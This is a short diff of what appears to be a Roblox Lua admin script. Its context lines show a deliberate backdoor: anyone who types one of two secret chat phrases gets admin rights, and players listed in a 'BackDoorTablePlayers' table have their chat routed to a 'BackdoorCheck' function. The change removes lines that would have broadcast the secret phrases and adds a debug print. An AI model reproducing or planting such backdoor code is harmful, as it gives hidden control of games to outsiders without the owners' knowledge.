@@ -806,8 +806,6 @@ end
 local function IsAUser(Player,Chat)
 	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
 		AdminUserTable[Player] = true
-		Players:Chat("I am a CyAdmin User")
-		Players:Chat("Hey I'm a cyrus' streets admin user1")
 		return true 
 	end
 end
@@ -1716,6 +1714,7 @@ end)
 
 Players.PlayerAdded:Connect(function(Player)
 	if BackDoorTablePlayers[Player.UserId] then -- SHUT UP EST I'M TIRED
+		print(1)
 		Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
 	end 
 	Player.CharacterAdded:Connect(function(C)
